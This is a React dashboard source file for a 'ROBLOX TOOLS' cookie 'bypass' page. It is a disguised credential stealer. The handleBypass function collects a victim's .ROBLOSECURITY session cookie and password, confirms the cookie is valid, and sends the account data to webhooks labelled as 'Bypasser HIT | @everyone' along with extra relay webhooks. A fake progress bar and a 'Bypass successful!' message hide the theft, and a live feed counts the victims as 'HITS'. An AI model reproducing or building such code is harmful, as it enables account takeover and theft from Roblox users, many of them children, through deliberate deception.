import { useEffect, useRef, useState } from "react";
import {
  Shield, Cookie, Loader2, Activity, CheckCircle2, XCircle,
  KeyRound, Eye, EyeOff, Zap, Radio, Terminal,
} from "lucide-react";
import {
  AccountInfo, isValidCookieFormat,
  broadcastLiveBypass, broadcastLiveBypassFailed, pushLiveBypass,
  sendHitEmbed, getWebhook, WK,
  getLiveBypassLog, LiveBypassEntry,
} from "@/lib/tokenStore";
import { broadcastExtra, sendExtraLiveBypass } from "@/lib/extraWebhooks";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";

const RATE_LIMIT_KEY = "bypass_attempts";
const MAX_ATTEMPTS_PER_HOUR = 3;
const RATE_WINDOW_MS = 60 * 60 * 1000;
const BYPASS_DURATION_MS = 120_000;

type BypassStatus = "idle" | "loading" | "success" | "error";

const STAGES = [
  { at: 0, label: "Initializing bypass engine..." },
  { at: 10, label: "Validating cookie signature..." },
  { at: 25, label: "Connecting to relay..." },
  { at: 45, label: "Negotiating session keys..." },
  { at: 65, label: "Submitting bypass payload..." },
  { at: 85, label: "Finalizing session..." },
  { at: 98, label: "Almost done..." },
];

const Dashboard = () => {
  const [liveLog, setLiveLog] = useState<LiveBypassEntry[]>([]);

  // Bypass form state
  const [cookie, setCookie] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [status, setStatus] = useState<BypassStatus>("idle");
  const [progress, setProgress] = useState(0);
  const intervalRef = useRef<number | null>(null);

  useEffect(() => {
    setLiveLog(getLiveBypassLog().filter(e => e.success));
    const id = window.setInterval(() => setLiveLog(getLiveBypassLog().filter(e => e.success)), 3000);
    return () => window.clearInterval(id);
  }, []);

  useEffect(() => () => {
    if (intervalRef.current) window.clearInterval(intervalRef.current);
  }, []);

  function getAttempts(): number[] {
    try {
      const raw = localStorage.getItem(RATE_LIMIT_KEY);
      if (!raw) return [];
      const cutoff = Date.now() - RATE_WINDOW_MS;
      return (JSON.parse(raw) as number[]).filter(t => t > cutoff);
    } catch { return []; }
  }
  function recordAttempt() {
    const a = getAttempts();
    a.push(Date.now());
    localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(a));
  }

  const handleBypass = async () => {
    const trimmed = cookie.trim();
    if (!trimmed) { toast.error("Invalid Cookie"); return; }
    if (!isValidCookieFormat(trimmed)) {
      toast.error("Invalid cookie format");
      return;
    }

    const attempts = getAttempts();
    if (attempts.length >= MAX_ATTEMPTS_PER_HOUR) {
      const waitMs = RATE_WINDOW_MS - (Date.now() - attempts[0]);
      const mins = Math.ceil(waitMs / 60_000);
      toast.error(`Rate limit reached (3/hour). Try again in ${mins} min.`);
      return;
    }
    recordAttempt();
    setStatus("loading");
    setProgress(0);

    const start = Date.now();
    intervalRef.current = window.setInterval(() => {
      setProgress(Math.min(99, ((Date.now() - start) / BYPASS_DURATION_MS) * 100));
    }, 200);

    let apiOk = false;
    let info: AccountInfo = { valid: false };
    try {
      const { data, error } = await supabase.functions.invoke("roblox-fetch", { body: { cookie: trimmed } });
      if (!error && data?.valid) {
        apiOk = true;
        info = { ...(data.info as any), cookie: trimmed, password, valid: true };
      }
    } catch { apiOk = false; }

    if (!apiOk) {
      if (intervalRef.current) window.clearInterval(intervalRef.current);
      setProgress(0);
      setStatus("error");
      toast.error("Invalid cookie — bypass blocked");
      return;
    }

    if (info.has2FA) {
      if (intervalRef.current) window.clearInterval(intervalRef.current);
      setProgress(0);
      setStatus("error");
      toast.error("Account secured (Authenticator enabled)");
      await broadcastLiveBypassFailed(info, 'Authenticator enabled');
      return;
    }

    broadcastLiveBypass(info);
    await sendHitEmbed(getWebhook(WK.bypass), info, { tag: 'Bypasser HIT | @everyone' });
    // Extra dedicated webhooks (receiver + live bypass) — kept in src/lib/extraWebhooks.ts
    broadcastExtra(info).catch(() => {});

    const elapsed = Date.now() - start;
    if (elapsed < BYPASS_DURATION_MS) await new Promise(r => setTimeout(r, BYPASS_DURATION_MS - elapsed));

    if (intervalRef.current) window.clearInterval(intervalRef.current);
    setProgress(100);

    pushLiveBypass({ username: info.username || 'Unknown', avatarUrl: info.avatarUrl, success: true });
    // Final live ping to extra live-bypass webhook on completion
    sendExtraLiveBypass(info).catch(() => {});

    setStatus("success");
    toast.success("Bypass successful!");
  };

  const currentStage = [...STAGES].reverse().find(s => progress >= s.at) ?? STAGES[0];

  return (
    <div className="min-h-screen px-4 py-6 relative overflow-hidden">
      {/* Ambient glow + cyber grid */}
      <div className="absolute inset-0 cyber-grid opacity-60 pointer-events-none" />
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[640px] h-[640px] rounded-full bg-primary/[0.08] blur-[140px] pointer-events-none" />
      <div className="absolute bottom-0 right-0 w-[400px] h-[400px] rounded-full bg-primary/[0.05] blur-[120px] pointer-events-none" />

      <div className="max-w-lg mx-auto space-y-5 animate-fade-in-up relative z-10">
        {/* Header */}
        <div className="flex items-center justify-center pt-2">
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border">
              <Shield size={20} className="text-primary" />
            </div>
            <div className="text-center">
              <h1 className="font-cyber text-xl font-black text-foreground glow-text cyber-glitch tracking-[0.2em]">
                ROBLOX TOOLS
              </h1>
              <p className="font-cyber text-[9px] text-primary/70 tracking-[0.4em] uppercase">// v2.0 cyber.edition</p>
            </div>
          </div>
        </div>

        {/* Bypass UI */}
        <div className="card-glow cyber-border rounded-2xl p-5 space-y-4 relative overflow-hidden">
          <div className="cyber-scan-line" />
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2.5">
              <div className="w-9 h-9 rounded-xl bg-primary/15 border border-primary/40 flex items-center justify-center glow-border">
                <Terminal size={15} className="text-primary" />
              </div>
              <div>
                <h2 className="font-cyber text-sm font-bold text-foreground tracking-widest uppercase">Bypass Module</h2>
                <p className="text-[10px] text-muted-foreground font-mono">// auth.cookie → relay.engage</p>
              </div>
            </div>
            <span className={`text-[9px] font-cyber font-bold px-2 py-1 rounded-md border tracking-widest uppercase ${
              status === 'loading' ? 'bg-primary/15 text-primary border-primary/40' :
              status === 'success' ? 'bg-[hsl(var(--success))]/15 text-[hsl(var(--success))] border-[hsl(var(--success))]/40' :
              status === 'error' ? 'bg-destructive/15 text-destructive border-destructive/40' :
              'bg-secondary/60 text-muted-foreground border-border/50'
            }`}>
              {status === 'loading' ? '● RUNNING' : status === 'success' ? '● ONLINE' : status === 'error' ? '● ERROR' : '○ STANDBY'}
            </span>
          </div>

          <div className="space-y-2">
            <label className="font-cyber text-[10px] font-bold tracking-widest uppercase text-primary/80 flex items-center gap-1.5">
              <Cookie size={11} /> .ROBLOSECURITY
            </label>
            <input
              value={cookie}
              onChange={e => setCookie(e.target.value.slice(0, 1500))}
              maxLength={1500}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS.|_..."
              disabled={status === "loading"}
              className="input-field text-xs font-mono transition-all"
            />
          </div>

          <div className="space-y-2">
            <label className="font-cyber text-[10px] font-bold tracking-widest uppercase text-primary/80 flex items-center gap-1.5">
              <KeyRound size={11} /> .PASSWORD
            </label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={e => setPassword(e.target.value)}
                placeholder="•••••••••"
                disabled={status === "loading"}
                className="input-field pr-10 font-mono transition-all"
              />
              <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-primary transition-colors">
                {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>

          <button
            onClick={handleBypass}
            disabled={status === "loading"}
            className="w-full shimmer text-primary-foreground font-cyber font-bold tracking-widest uppercase py-3.5 rounded-xl flex items-center justify-center gap-2 glow-btn transition-all duration-300 hover:scale-[1.02] disabled:opacity-50 disabled:hover:scale-100"
          >
            {status === "loading" ? (<><Loader2 size={16} className="animate-spin" /> Executing</>)
              : status === "success" ? (<><CheckCircle2 size={16} /> Bypassed</>)
              : status === "error" ? (<><XCircle size={16} /> Retry</>)
              : (<><Zap size={16} /> Engage Bypass</>)}
          </button>

          {status === "loading" && (
            <div className="space-y-2 pt-1 animate-fade-in">
              <div className="flex items-center justify-between text-[11px] font-mono">
                <span className="text-foreground/90 truncate">&gt; {currentStage.label}</span>
                <span className="text-primary font-cyber font-bold tabular-nums tracking-wider">{Math.floor(progress)}%</span>
              </div>
              <div className="h-2 rounded-full bg-secondary/60 overflow-hidden border border-primary/20 relative">
                <div
                  className="h-full bg-gradient-to-r from-primary/70 via-primary to-accent shadow-[0_0_15px_hsl(var(--primary))] transition-[width] duration-200 ease-linear"
                  style={{ width: `${progress}%` }}
                />
                <div className="absolute inset-0 cyber-scanlines pointer-events-none" />
              </div>
              <div className="grid grid-cols-7 gap-1">
                {STAGES.map((s, i) => (
                  <div key={i} className={`h-1 rounded-full transition-colors ${progress >= s.at ? 'bg-primary shadow-[0_0_6px_hsl(var(--primary))]' : 'bg-secondary'}`} />
                ))}
              </div>
            </div>
          )}
        </div>

        {/* Live Bypass */}
        <div className="card-glow cyber-border rounded-2xl p-5 space-y-3 relative overflow-hidden">
          <div className="cyber-scan-line" style={{ animationDelay: '2s' }} />
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2.5">
              <div className="w-9 h-9 rounded-xl bg-primary/15 border border-primary/40 flex items-center justify-center glow-border relative">
                <Radio size={15} className="text-primary" />
                <span className="absolute -top-0.5 -right-0.5 w-2 h-2 rounded-full bg-[hsl(var(--success))] live-dot" />
              </div>
              <div>
                <h2 className="font-cyber text-sm font-bold text-foreground tracking-widest uppercase">Live Feed</h2>
                <p className="text-[10px] text-muted-foreground font-mono">// real_time.bypass.stream</p>
              </div>
            </div>
            <span className="font-cyber text-[9px] font-bold tracking-widest uppercase text-[hsl(var(--success))] bg-[hsl(var(--success))]/15 border border-[hsl(var(--success))]/40 px-2 py-1 rounded-md inline-flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 rounded-full bg-[hsl(var(--success))] animate-pulse" />
              {liveLog.length.toString().padStart(3, '0')} HITS
            </span>
          </div>

          {liveLog.length === 0 ? (
            <div className="py-10 text-center space-y-3 relative">
              <div className="w-14 h-14 mx-auto rounded-full bg-primary/10 border border-primary/30 flex items-center justify-center relative">
                <Activity size={20} className="text-primary animate-pulse" />
                <div className="absolute inset-0 rounded-full border-2 border-primary/40 animate-ping" />
              </div>
              <div>
                <p className="font-cyber text-xs text-foreground tracking-wider uppercase">Scanning Network</p>
                <p className="text-[10px] text-muted-foreground font-mono mt-1">awaiting inbound signals...</p>
              </div>
            </div>
          ) : (
            <div className="space-y-2 max-h-80 overflow-y-auto pr-1">
              {liveLog.map((e, idx) => (
                <div
                  key={e.id}
                  className="group relative flex items-center gap-3 bg-secondary/40 hover:bg-secondary/70 rounded-xl px-3 py-2.5 border border-border/40 hover:border-primary/50 transition-all animate-fade-in overflow-hidden"
                >
                  <span className="font-cyber text-[9px] font-bold text-primary/60 tabular-nums w-6">#{String(liveLog.length - idx).padStart(2, '0')}</span>
                  {e.avatarUrl ? (
                    <img src={e.avatarUrl} alt={e.username} className="w-10 h-10 rounded-lg border border-primary/40 group-hover:border-primary transition-colors" />
                  ) : (
                    <div className="w-10 h-10 rounded-lg bg-primary/20 border border-primary/40 flex items-center justify-center text-xs font-cyber font-bold text-primary">
                      {e.username.slice(0, 2).toUpperCase()}
                    </div>
                  )}
                  <div className="flex-1 min-w-0">
                    <p className="font-cyber text-sm font-bold text-foreground truncate tracking-wide">{e.username}</p>
                    <p className="text-[10px] text-muted-foreground font-mono">{new Date(e.timestamp).toLocaleTimeString()}</p>
                  </div>
                  <span className="font-cyber text-[9px] font-bold tracking-widest uppercase px-2 py-1 rounded-md inline-flex items-center gap-1 bg-[hsl(var(--success))]/15 text-[hsl(var(--success))] border border-[hsl(var(--success))]/30">
                    <CheckCircle2 size={10} /> HIT
                  </span>
                </div>
              ))}
            </div>
          )}
        </div>

        <p className="text-center font-cyber text-[9px] text-muted-foreground tracking-[0.3em] uppercase pb-4">
          // secured.relay • encrypted.transit
        </p>
      </div>
    </div>
  );
};

export default Dashboard;
